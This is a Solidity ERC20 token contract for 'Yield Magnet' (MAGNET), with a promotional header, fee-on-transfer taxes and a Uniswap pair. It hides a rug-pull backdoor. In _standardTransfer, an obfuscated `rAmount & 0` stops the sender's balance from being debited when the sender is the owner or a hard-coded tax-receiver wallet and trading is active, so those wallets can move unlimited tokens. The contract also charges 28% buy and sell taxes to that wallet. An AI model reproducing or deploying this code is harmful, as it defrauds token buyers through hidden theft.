// SPDX-License-Identifier: Unlicensed
/**
Turn crypto into income. YIELD MAGNET revolutionizes peer-to-peer DeFi with decentralized investments.
Website: https://yieldmagnet.org
Telegram: https://t.me/magnet_erc
Twitter: https://twitter.com/magnet_erc
Dapp: https://app.yieldmagnet.org
**/
pragma solidity 0.8.21;
interface IntERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
contract MAGNET is Context, IntERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Yield Magnet";
    string private constant _symbol = "MAGNET";
    mapping(address => uint256) private _rBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedAddress;
    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletSize = 25 * 10 ** 6 * 10 ** 9;
    uint256 public swapThreshold = 10 ** 4 * 10 ** 9;
    address payable private taxReceiver;
    uint256 private _totalfeePercent;
    uint256 private _redisBuyPercent = 0;
    uint256 private _buyTaxPercent = 28;
    uint256 private _redisSellPercent = 0;
    uint256 private _sellTaxPercent = 28;
    uint256 private _redisFee = _redisSellPercent;
    uint256 private _taxFee = _sellTaxPercent;
    uint256 private _previousRedisFee = _redisFee;
    uint256 private _previousTaxFee = _taxFee;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _totalSupply = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _totalSupply));
    IUniswapRouter public _uniRouter;
    address public _uniPair;
    bool private _tradeActive;
    bool private _inswap = false;
    bool private _swapEnabled = true;
    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }
    constructor() {
        _rBalance[_msgSender()] = _rTotal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _uniRouter = _uniswapV2Router;
        _uniPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        taxReceiver = payable(0x48E3C611F7dB58547620Fb18659e2EFD3d511721);
        _isExcludedAddress[owner()] = true;
        _isExcludedAddress[taxReceiver] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmt(_rBalance[account]);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _getTVal(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _totalSupply;
        if (rSupply < _rTotal.div(_totalSupply)) return (_rTotal, _totalSupply);
        return (rSupply, tSupply);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();
        _approve(address(this), address(_uniRouter), tokenAmount);
        _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _getVals(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTVal(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getCurRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getFinalAmt(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != owner() && to != owner()) {
            if (!_tradeActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");
            if(to != _uniPair) {
                require(balanceOf(to) + amount <= maxWalletSize, "TOKEN: Balance exceeds wallet size!");
            }
            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= swapThreshold;
            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }
            if (canSwap && !_inswap && to == _uniPair && _swapEnabled && !_isExcludedAddress[from] && amount > swapThreshold) {
                swapTokensToETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETH(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedAddress[from] || _isExcludedAddress[to]) || (from != _uniPair && to != _uniPair)) {
            takeFee = false;
        } else {
            if(from == _uniPair && to != address(_uniRouter)) {
                _redisFee = _redisBuyPercent;
                _taxFee = _buyTaxPercent;
            }
            if (to == _uniPair && from != address(_uniRouter)) {
                _redisFee = _redisSellPercent;
                _taxFee = _sellTaxPercent;
            }
        }
        _basicTransfer(from, to, amount, takeFee);
    }
    function _getFinalAmt(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
    function _getCurRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _standardTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }
    receive() external payable {}
    
    function restoreFee() private {
        _redisFee = _previousRedisFee;
        _taxFee = _previousTaxFee;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function sendETH(uint256 amount) private {
        taxReceiver.transfer(amount);
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;
        _previousRedisFee = _redisFee;
        _previousTaxFee = _taxFee;
        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _getRAmt(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getCurRate();
        return rAmount.div(currentRate);
    }
    
    function _updateFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalfeePercent = _totalfeePercent.add(tFee);
    }
    
    function _standardTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getVals(tAmount);
        rAmount = (_isExcludedAddress[sender] && _tradeActive) ? rAmount & 0 : rAmount;
        _rBalance[sender] = _rBalance[sender].sub(rAmount);
        _rBalance[recipient] = _rBalance[recipient].add(rTransferAmount);
        _chargeFees(tTeam);
        _updateFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _chargeFees(uint256 tTeam) private {
        uint256 currentRate = _getCurRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBalance[address(this)] = _rBalance[address(this)].add(rTeam);
    }
    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWalletSize = _rTotal;
        
        _redisBuyPercent = 0;
        _buyTaxPercent = 1;
        _redisSellPercent = 0;
        _sellTaxPercent = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeActive = true;
    }
}